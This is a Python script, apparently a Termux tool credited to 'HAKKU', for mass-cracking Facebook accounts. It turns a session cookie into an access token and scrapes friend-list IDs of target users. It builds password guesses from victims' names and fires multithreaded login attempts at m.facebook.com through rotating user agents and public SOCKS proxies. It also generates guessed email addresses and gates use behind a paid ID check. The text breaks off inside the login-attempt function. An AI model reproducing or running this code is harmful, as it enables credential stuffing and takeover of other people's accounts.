## LO GANTENG :V 

## JEECK COOL BOY

import requests,bs4,json,os,sys,random,datetime,time,re,string,threading

import urllib3,rich,base64

from rich.tree import Tree

from rich import print as cetak

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from rich.console import Console

from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn

from rich.progress import SpinnerColumn

from concurrent.futures import ThreadPoolExecutor as tred

from rich.panel import Panel as nel

from rich.tree import Tree

from rich import print as cetak

from rich.columns import Columns as col

from rich import print as Minimal__Jangan__Fitnah__Ya__Bang

from rich import print as prints

from rich import pretty

from rich.text import Text as tekz

console = Console()

###----------[ WARNA PRINT RICH ]---------- ###

M2 = "[#FF0000]" # MERAH

H2 = "[#00FF00]" # HIJAU

K2 = "[#FFFF00]" # KUNING

B2 = "[#00C8FF]" # BIRU

P2 = "[#FFFFFF]" # PUTIH

try:

	file_color = open("data/theme_color","r").read()	color_text = file_color.split("|")[0]

	color_nel = file_color.split("|")[1]

except:

	color_text = "[#00C8FF]"

	colorbapa = random.choice([H2,K2,M2,B2,P2]) 

	color_nel = "#00C8FF"

pretty.install()

CON=sol()

ugen2=[]

ugen=[]

proxxy=[]

cokbrut=[]

dump = []

ses=requests.Session()

princp=[]

def ua_krek():

        rr = random.randint

        model = random.choice(['RMX3286','RMX3491'])

        ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Vision3 Build/MRA58K) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/AXIS;FBMF/Vision;FBBD/Vision;FBDV/Vision3;FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]")

        return ua

for xd in range(10000):

    a='Mozilla/5.0 (Symbian/3; Series60/5.2'

    b=random.randrange(1, 9)

    c=random.randrange(1, 9)

    d='NokiaN8-00/012.002;'

    e=random.randrange(100, 9999)

    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'

    g=random.randrange(1, 9)

    h=random.randrange(1, 4)

    i=random.randrange(1, 4)

    j=random.randrange(1, 4)

    k='7.3.0 Mobile Safari/533.4 3gpp-gba'

    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

    ugen2.append(uaku) 

	###----------[ User Agent Linux ]---------- ###

    aa='Mozilla/5.0 (X11;'

    b=random.choice(['6','7','8','9','10','11','12'])

    c='Linux x86_64)'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

for x in range(1000):

    rr = random.randint

    rc = random.choice

    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"

    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"

    tiga  = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"

    empat  = f"Mozilla/5.0 (Linux; Android 9{str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"

    lima  = f"Mozilla/5.0 (Linux; Android 12{str(rr(7,12))}; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"

    UserAgentss = str(rc([satu,dua,tiga,empat,lima]))

    ugen.append(UserAgentss)

try:

    url_proxy = random.choice([

              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",

])

except:pass

   

def linex():

        print('\033[1;37m----------------------------------------------')

#------------------[ HAKKU ]-------------------#

try:

    url = requests.get(f"{url_proxy}").text

    for ikfar in url.splitlines():proxxy.append(ikfar)

except requests.exceptions.ConnectionError:

   print("NO INTERNET PLEASE CONNECT WITH THE INTERNET");exit()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

cokbrut=[]

pwpluss,pwnya=[],[]

P = '\x1b[1;97m'

M = '\x1b[1;91m'

H = '\x1b[1;92m'

K = '\x1b[1;93m'

B = '\x1b[1;94m'

U = '\x1b[1;95m' 

O = '\x1b[1;96m'

N = '\x1b[0m'    

Z = "\033[1;30m"

sir = '\033[41m\x1b[1;97m'

x = '\33[m' # DEFAULT

m = '\x1b[1;91m' #RED +

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +

asu = random.choice([m,k,h,u,b])

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}

dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def renv_xy(u):

        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)

        

def jalan(keliling):

	for mau in keliling + '\n':

		sys.stdout.write(mau)

		sys.stdout.flush();sleep(0.03) 

		

def animasi():

    print('\r[HAKKU-GOD] COLLECTING ID IS ON PROCESS  %s ID'%(str(len(dump))),end=''); sys.stdout.flush()

#------------------[ WARNA ]-------------------#

try:

	color_rich = open("data/color_rich.txt","r").read()

except FileNotFoundError:

	color_rich = "[#afafff]"

try:

	color_table = open("data/color_table.txt","r").read()

except FileNotFoundError:

	color_table = "#afafff"

#------------------[ WARNA FOR RICH ]-------------------#

Z2 = "[#000000]" # HITAM

M2 = "[#FF0000]" # MERAH

H2 = "[#00FF00]" # HIJAU

K2 = "[#FFFF00]" # KUNING

B2 = "[#00C8FF]" # BIRU

U2 = "[#AF00FF]" # UNGU

N2 = "[#FF00FF]" # PINK

O2 = "[#00FFFF]" # BIRU MUDA

P2 = "[#FFFFFF]" # PUTIH

J2 = "[#FF8F00]" # JINGGA

A2 = "[#AAAAAA]" # ABU-ABU

#------------------[ RANDOM COLOR RICH ]-------------------#

L1 = "[#875f5f]" # LIGHT

G1  = "[#ffd700]" # GOLD

M1  = "[#875fd7]" # MEDIUM GREEN

P1   = "[#FF00FF]" # PINK

W1  = "[#FFFFFF]" # WHITE

S1   = "[#87afff]" # SKY BLUE

O1   = "[#d78700]" # ORANGE3

O3   = "[#ff5fff]" # MEDIUM ORCH3

#------------------[ COLOR TABLE FOR RICH ]-------------------#

LIGHT = "#875f5f" # LIGHT

GOLD    = "#ffd700" # GOLD

MEDIUM  = "#875fd7" # MEDIUM GREEN

PINK    = "#FF00FF" # PINK

WHITE  = "#FFFFFF" # WHITE

SKY     = "#87afff" # SKY BLUE

ORNG   = "#d78700" # ORANGE3

ORCH   = "#ff5fff" # MEDIUM ORCH

    #------------------[ RANDOM RICH ]-------------------#

DIT      = random.choice([M2,K2,H2,B2])

TYA     = random.choice ([LIGHT,GOLD,MEDIUM,PINK,SKY,ORNG,ORCH])

ADTYA1 = random.choice([L1,G1,M1,P1,S1,O1,O1])

ADTYA2 = random.choice([H,K,O,B])

holaa="38;5"

ro=(f"\033[{holaa};208")

rb=(f"\033[{holaa};32")

rc=(f"\033[{holaa};122m")

rg= (f"\033[{holaa};112m")

rp=(f"\033[{holaa};147m")

#--(Dark@Colours)---#

r="\033[1;91m"

g="\033[1;92m"

y="\033[1;93m"

b="\033[1;94m"

p="\033[1;95m"

c="\033[1;96m"

l="\033[1;97m"

s="\033[0m"

#--(light@Colours)---#

lr="\033[0;91m"

lg="\033[0;92m"

ly="\033[0;93m"

lb="\033[0;94m"

lp="\033[0;95m"

lc="\033[0;96m"

ll="\033[0;97m"

pemisah = '|'

def xchker():

    pass

def clear():

	os.system('clear')

def back():

	login()

	

def none():

	clear()

	prints(nel(f"""\t {color_text} 

db   db  .d8b.  db   dD db   dD db    db        db    db d8888b.

88   88 d8' `8b 88 ,8P' 88 ,8P' 88    88        `8b  d8' 88  `8D

88ooo88 88ooo88 88,8P   88,8P   88    88         `8bd8'  88   88

88~~~88 88~~~88 88`8b   88`8b   88    88 C8888D  .dPYb.  88   88

88   88 88   88 88 `88. 88 `88. 88b  d88        .8P  Y8. 88  .8D

YP   YP YP   YP YP   YD YP   YD ~Y8888P'        YP    YP Y8888D'

         Made By {M2}HAKKU {P2}DON""",width=80,style=f"{color_nel}"))

def info():

	prints(f"""{B2}╭─────────────────────╮{B2}╭───────────────╮

{B2}│ {P2}Author : HAKKU{B2}     {B2}│{P2} Version : 1.0{B2} │

{B2}╰─────────────────────╯{B2}╰───────────────╯""")

def banner():

	clear()

	prints(nel(f"""\t {color_text} 

db   db  .d8b.  db   dD db   dD db    db        db    db d8888b.

88   88 d8' `8b 88 ,8P' 88 ,8P' 88    88        `8b  d8' 88  `8D

88ooo88 88ooo88 88,8P   88,8P   88    88         `8bd8'  88   88

88~~~88 88~~~88 88`8b   88`8b   88    88 C8888D  .dPYb.  88   88

88   88 88   88 88 `88. 88 `88. 88b  d88        .8P  Y8. 88  .8D

YP   YP YP   YP YP   YD YP   YD ~Y8888P'        YP    YP Y8888D'

         Made By {M2}HAKKU {P2}DON""",width=80,style=f"{color_nel}"))

def login():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			print('NO INTERNET')

			exit()

	except IOError:

		login_lagi334()

def login_lagi334():

	try:

		os.system('clear')

		banner()

		info() 

		ses = requests.Session()

		cookie = input('\nENTER YOUR COOKIES : ')

		cookies = {'cookie':cookie}

		url = 'https://www.facebook.com/adsmanager/manage/campaigns'

		req = ses.get(url,cookies=cookies)

		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)

		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)

		roq = ses.get(nek,cookies=cookies)

		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)

		tokenw = open(".token.txt", "w").write(tok)

		cokiew = open(".cok.txt", "w").write(cookie)

		print('\nLOGIN IS SUCCESSED ')

		print('\n RUN run.py')

		exit()

	except Exception as e:

		os.system("rm -f .token.txt")

		os.system("rm -f .cok.txt")

		print(f'\033[0mLOGIN FAILED MAY BE CASE OF EXPIRED COOKIES')

		exit()

#-----------[APPROVAL]--------------------#

#clear from line 287 to line 319 for no approval

def hakkulord(): 

  uuid = str(os.geteuid()) + str(os.getlogin()) 

  id = "-".join(uuid) 

  os.system("clear")

  banner()

  print("╚═➣ YOUR ID: "+id) 

  print("\n")

  try: 

    httpCaht = requests.get("https://raw.githubusercontent.com/PROX-GOD/ESEWA/main/Esewa.txt").text 

    if id in httpCaht: 

      print("╚═➣ STATUS: PREMIUM[✅️]") 

      msg = str(os.geteuid()) 

      time.sleep(3) 

      pass 

    else: 

      print("╚═➣ ID NOT REGISTERED[✘]\n") 

      print("To pay please follow the steps: ")

      print("1. Go to eSewa and select 'Send Money'")

      print("2. Enter the following eSewa ID: 000000000")

      print("3. Enter the amount and continue")

      print("4. The Amount Is Rs 100")

      print("5. AFTER YOU SEND PAYMENT SEND YOUR KEY TO USER FACEBOOK\n")

      os.system("xdg-open https://www.facebook.com/H4KKUBAUF33LTH3POW3R")

      time.sleep(1) 

      sys.exit() 

  except: 

    sys.exit() 

    if name == '__main__': 

     banner()

     preshaklord() 

#------------------#

def menu(my_name,my_id):

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

	except IOError:

		print('\033[0mCOOKIES IS EXPIRED ')

		time.sleep(5)

		login_lagi334()

	os.system('clear')

	banner()

	print('')

	try:cek_data = requests.get("http://ip-api.com/json/").json()

	except:cek_data = {'-'}

	try:MeledakXd = cek_data["isp"]

	except:MeledakXd = {'-'}

	try:MeledakSu = cek_data["city"]

	except:MeledakSu = {'-'}

	info() 

	prints(nel(f'{P2}Login As %s %s{P2}'%((my_id),MeledakSu),width=55,padding=(0,7),style=f"{color_nel}")) 

	Farz1 = f"{H2}01\n02\n03\n04\n05\n06\n00"

	Farz2 = f"{P2}CRACK PUBLIC\nCRACK FILE\nCREATE FILE\nSEPERATE IDS\nCRACK EMAIL\nMAKE HEADERS\nEXIT"

	Farz3 = f"{H2}ON\nON\nON\nON\nON\nON\nOn"

	ifc = me()

	ifc.add_column(f"{P2}NO", style=TYA, justify='left')

	ifc.add_column(f"{P2}MENU", style=TYA, justify='left',width=55)

	ifc.add_column(f"{P2}STATUS", style=TYA, justify='left')

	ifc.add_row(Farz1,Farz2,Farz3)

	sol().print(ifc, justify='left',style=f"{color_table}")

	Meledak = input('CHOOSE : ')

	print('')

	if Meledak in ['1']:

		dump_massal()

	elif Meledak in ['2']:

		crack_file()

	elif Meledak in ['3']:

		dump_fl_fl()

		simpan_file()

	elif Meledak in ['4']:

		sep()

	elif Meledak in ['5']:

		Menu__Untuk__Dump__Email__Masal___Si__Kontol()

	elif Meledak in ['6']:

		siu()

	elif Meledak in ['0']:

		os.system('rm -rf .token.txt')

		os.system('rm -rf .cok.txt')

		print('THANKS FOR YOUR TIME')

		exit()

	else:

		print('INPUT INCORRECT ')

		back()

def siu():

	start()

	get_data_web()

	akhir()

def error():

	print(f'IT IS BEING FIX {x}')

	time.sleep(4)

	back()

def ganti_tema():

		print("Sorry, this tool is currently being repaired ")

		sleep(2) 

		back()

#--> Dump Friendlist Dari Friendlist

class dump_fl_fl:

    def __init__(self):

        global dump

        dump = self.dump = []

        self.fail        = []

        self.pisah       = pemisah

        self.xyz         = requests.Session()

        self.cookie      = {'cookie':open('.cok.txt','r').read()}

        self.token_eaag  = open('.token.txt','r').read()

        self.token_eaab  = open('.token.txt','r').read()

        self.main()

    def main(self):

        print('ENTER PUBLIC ID USE COMMA TO ADD MORE ID (,)')

        print('EXAMPLE : 10089782728927,100084938372627')

        id = input('ENTER ID : ').split(',')

        print('')

        for f in id:

            if f == 'me': io = f

            elif (re.findall("[a-zA-Z]",str(f))) : io = user_to_id(f)

            else : io = f

            self.cek(io)

        print('')

        for d in self.fail:

            try: id.remove(d)

            except Exception as e: continue

        self.t1 = input('DUMP OLD/MIX [t/m] : ').lower()

        self.t2 = input('HOW MANY ID DO YOU WANT TO EXTRACT FROM EACH ID \n DONT ENTER MORE THAN 500" ENTER : ')

        print('')

        try:

            for s in id:

                if s == 'me': io = s

                elif (re.findall("[a-zA-Z]",str(s))) : io = user_to_id(s)

                else : io = s

                lid = self.requ(io,'1')

            try:

                for h in lid:

                    self.requ(h.split(self.pisah)[0],'2')

            except Exception as e:

                pass

        except KeyboardInterrupt: pass

        if len(self.dump) == 0: print('\rDUMP UNSUCESSFULL')

        else: print('\rCOLLECTED %s ID'%(str(len(self.dump))))

    def cek(self,id):

        try: 

            nama  = str(self.xyz.get('https://graph.facebook.com/%s?fields=name&access_token=%s'%(id,self.token_eaag),cookies=self.cookie).json()['name'])

            teman = str(self.xyz.get('https://graph.facebook.com/%s/friends?fields=summary&limit=0&access_token=%s'%(id,self.token_eaab),cookies=self.cookie).json()['summary']['total_count'])

            print(' • %s --> %s TOTAL FRIENDS'%(nama,teman))

        except Exception as e:

            print(' • %s --> ID/Private'%(id))

            self.fail.append(id)

    def requ(self,id,tp):

        url = 'https://graph.facebook.com/%s/friends?fields=id,name&limit=5000&access_token=%s'%(id,self.token_eaab)

        try:

            req = self.xyz.get(url,cookies=self.cookie).json()

            pen = [ '%s%s%s'%(y['id'],self.pisah,y['name']) for y in req['data']]

            sm_ = []

            sm  = []

            if self.t1 in ['1','01','t','tua']:

                for z in pen:

                    sm.append(z)

                    if len(sm) == int(self.t2): break

            else:

                for z in pen:

                    sm_.insert(0,z)

                for z_ in sm_:

                    sm.append(z_)

                    if len(sm) == int(self.t2): break

                if tp == '1':

                    return(sm)

                else:

                    for h in sm:

                        if h in self.dump:pass

                        else:self.dump.append(h)

                        animasi()

        except Exception as e: pass

        

def sep():

        xchker()

        os.system('clear');banner();xchker()

        try:

                limit = int(input(' How many links do you want to separate ? '))

        except:

                limit = 1

        print(f'{rg} File Path Example /sdcard/xxx.txt{s}')

        file_name = input('\033[0m Input file path : ')

        print(f'{rg} Save As Example /sdcard/newfile.txt{s}')

        new_save = input('\033[0m Save new file as : ')

        y = 0

        print(f"{ro} Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")

        for k in range(limit):

                y+=1

                links=input(' Put Uid Type : ')

                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)

        print(44*"\033[0m-")

        print(f'{rc} ids grabbed successfully{s}')

        print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))

        print('\033[0m New file saved as : \033[0;33m '+new_save)

        print(44*"\033[0m-")

        input('\033[0m[Press enter to back] ')

        login()

        

#--> Simpan File Ke Perangkat

class simpan_file:

    def __init__(self):

        self.main()

    def main(self):

        print('')

        ty = input('Save Files? [y/t] : ').lower()

        if ty in ['1','01','y','ya','iya']: self.main2()

        else: pass

    def main2(self):

        try:os.mkdir('dump')

        except:pass

        try:

            nm  = input('ENTER FILE NAME WITHOUT .TXT : ').replace(' ','_') + '.txt'

            lk  = input('ENTER FOLDER NAME OR /sdcard ONLY : ')

            lok = '%s/%s'%(lk,nm)

            open(lok,'a+')

            for d in dump:

                try: open(lok,'a+').write(d+'\n')

                except Exception as e: pass

            print('\nFILE SAVED SUCCESSFULLY %s'%(lok))

        except Exception as e:

            print('\nYOU DONE WRONG PROCESS FILE WILL BE SAVED AUTO ON DUMP FOLDER ON SDCARD')

            lok = 'hakkudump/%s.txt'

            open(lok,'a+')

            for d in dump:

                try: open(lok,'a+').write(d+'\n')

                except Exception as e: pass

            print('FILE SAVED ON :  %s'%(lok))

###----------[ CRACK DARI EMAIL  ]---------- ###

def Menu__Untuk__Dump__Email__Masal___Si__Kontol():

	rc = random.choice

	rr = random.randint

	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']

	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']

	global ok , cp

	nama = console.input(f' {H2}{P2} Enter Fullname : ')

	if ',' in str(nama):

		print(f" {H2}{P2} masukan nama, jangan kosong ngab")

		time.sleep(3);exit()

	print(" \n ENTER YOUR DOMAIN EX @gmail.com")

	doma = console.input(f'\n {H2}{P2} ENTER DOMAIN : ')

	if '@' not in str(doma) or '.com' not in str(doma):

		print(f" {H2}{P2} masukan domain dengan benar")

		time.sleep(3);exit()

	jumlah = console.input(f' {H2}{P2} total dump : ')

	for xyz in range(int(jumlah)):

		A = nama

		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']

		C = doma

		D = f'{A}{str(rc(B))}{C}'

		if D in id:pass

		else:id.append(D+'|'+nama)

		if len(dump)==999999:setting()

		sys.stdout.write(f"\r \n{H}{P} Dumping {H}{len(id)}{P} id...");sys.stdout.flush()

		time.sleep(0.0000003)

	print("\r")

	setting()	

#-------------#

def dump_massal():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

	except IOError:

		exit()

	try:

		jum = int(input('HOW MUCH ID DO YOU WANNA CRACK : '))

	except ValueError:

		print('INPUT NUMBERS ')

		exit()

	if jum<1 or jum>100:

		print('MAX DUMP LIMIT IS 100')

		exit()

	ses=requests.Session()

	yz = 0

	for met in range(jum):

		yz+=1

		kl = input('ENTER THE ID'+str(yz)+' : ')

		uid.append(kl)

	for userr in uid:

		try:

			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()

			for mi in col['friends']['data']:

				try:

					iso = (mi['id']+'|'+mi['name'])

					if iso in id:pass

					else:id.append(iso)

				except:continue

		except (KeyError,IOError):

			pass

		except requests.exceptions.ConnectionError:

			print('CHECK DATA ')

			exit()

	try:

		print('')

		print(f'TOTAL ID {h}'+str(len(id)))

		setting()

	except requests.exceptions.ConnectionError:

		print(f'{x}')

		print('NO INTERNET')

		back()

	except (KeyError,IOError):

		print(f'{k}ID ISNT PUBLIC{x}')

		time.sleep(3)

		back()

def crack_file():

	o = input('FILE NAME : ')

	print('')

	try:lin = open(o).read().splitlines()

	except:

		print('• File Not Found')

		time.sleep(2)

		back()

	for xid in lin:

		id.append(xid)

	setting()

def setting():

	print('')

	print("1. CRACK OLD\n2. CRACK NEW\n3. CRACK RANDOM\n")

	hu = input('CHOOSE : ')

	if hu in ['1','old']:

		for tua in sorted(id):

			id2.append(tua)

			

	elif hu in ['2','new']:

		muda=[]

		for bacot in sorted(id):

			muda.append(bacot)

		bcm=len(muda)

		bcmi=(bcm-1)

		for xmud in range(bcm):

			id2.append(muda[bcmi])

			bcmi -=1

	elif hu in ['3','random']:

		for bacot in id:

			xx = random.randint(0,len(id2))

			id2.insert(xx,bacot)

	else:

		print('Error ')

		exit()

		print('')

		

	print('')

	print("1. METHOD-1\n2. METHOD-2\n3. METHOD-3\n4. METHOD-4\n")

	hc = input('INPUT  : ')

	if hc in ['1','01']:

		method.append('mobile')

	elif hc in ['2','02']:

		method.append('free')

	elif hc in ['3','03']:

		method.append('Api')

	elif hc in ['4','04']:

		method.append('apikuv2')

	else:

		method.append('mobile')

	su() 

def su():

	print("PASSLIST\n")

	print("1. PASS-1[BEST]\n2. PASS-2[VERY FAST]\n")

	ch = input('INPUT  : ')

	if ch in ['1','01']:

		babi()

	elif ch in ['2','02']:

		sulap()

	else:

		babi()

def sulap():

	global prog,des

	print('')

	print(f'╰─ {h}OK{x} Save in : {h}OK/%s {x}'%(okc))

	print(f'╰─ {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))

	print(f'╰─ USE AEROPLANE MOD AFTER 500 ID DONT EXIT TERMUX\n')

	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))

	des = prog.add_task('',total=len(id))

	with prog:

		with tred(max_workers=30) as pool:

			for yuzong in id2:

				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

				frs = nmf.split(' ')[0]

				pwv = []

				if len(nmf)<6:

					if len(frs)<3:

						pass

					else:

						pwv.append(nmf)

						pwv.append(frs+'123')

						pwv.append(frs+'12345')

						pwv.append(frs+'123456')

				else:

					if len(frs)<3:

						pwv.append(nmf)

					else:

						pwv.append(nmf)

						pwv.append(frs+'123')

						pwv.append(frs+'12345')

						pwv.append(frs+'123456')

				if 'ya' in pwpluss:

					for xpwd in pwnya:

						pwv.append(xpwd)

				else:pass

				if 'mobile' in method:

					pool.submit(crack,idf,pwv)

				elif 'free' in method:

					pool.submit(crackfree,idf,pwv)

				elif 'Api' in method:

					pool.submit(Api,idf,pwv)

				elif 'apikuv2' in method: 

					pool.submit(apikuv2,idf,pwv)

				else:

					pool.submit(crack,idf,pwv)

		print('')

		cetak('CRACK COMPLETED%s Ok:%s Cp:%s'%((len(id)),ok,cp))

		print('')

		

def babi():

	os.system('clear')

	banner()

	global prog,des

	print('')

	print(f'╰─ {h}OK{x} Save in : {h}OK/%s {x}'%(okc))

	print(f'╰─ {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))

	print(f'╰─ USE AEROPLANE MOD DONT EXIT TERMUX\n')

	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))

	des = prog.add_task('',total=len(id))

	with prog:

		with tred(max_workers=30) as pool:

			for yuzong in id2:

				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

				frs = nmf.split(' ')[0]

				pwv = []

				if len(nmf)<6:

					if len(frs)<3:

						pass

					else:

						pwv.append(nmf)

						pwv.append(frs+'321')

						pwv.append(frs+'123')

						pwv.append(frs+'12345')

						pwv.append(frs+'786')

						pwv.append(frs+'@#12')

						pwv.append(frs+'@1234')

						pwv.append(frs+'@@')

						pwv.append(frs+'@786')

						pwv.append(frs+'@123')

				else:

					if len(frs)<3:

						pwv.append(nmf)

					else:

						pwv.append(nmf)

						pwv.append(frs+'321')

						pwv.append(frs+'123')

						pwv.append(frs+'12345')

						pwv.append(frs+'786')

						pwv.append(frs+'@#12')

						pwv.append(frs+'@1234')

						pwv.append(frs+'@@')

						pwv.append(frs+'@786')

						pwv.append(frs+'@123')

				if 'ya' in pwpluss:

					for xpwd in pwnya:

						pwv.append(xpwd)

				else:pass

				if 'mobile' in method:

					pool.submit(crack,idf,pwv)

				elif 'free' in method:

					pool.submit(crackfree,idf,pwv)

				elif 'Api' in method:

					pool.submit(Api,idf,pwv)

				else:

					pool.submit(crack,idf,pwv)

		print('')

		cetak('CRACK COMPLETED %s Ok:%s Cp:%s'%((len(id)),ok,cp))

		print('')

def crack(idf,pwv):

	global loop,ok,cp

	bi = random.choice(['\33[m'])

	pers = loop*100/len(id2)

	fff = '%'

	prog.update(des,description=f'\r[deep_white] [HAKKU_P.FB] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')

	prog.advance(des)

	ses = requests.Session()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	for pw in pwv:

		try:

			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})

			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

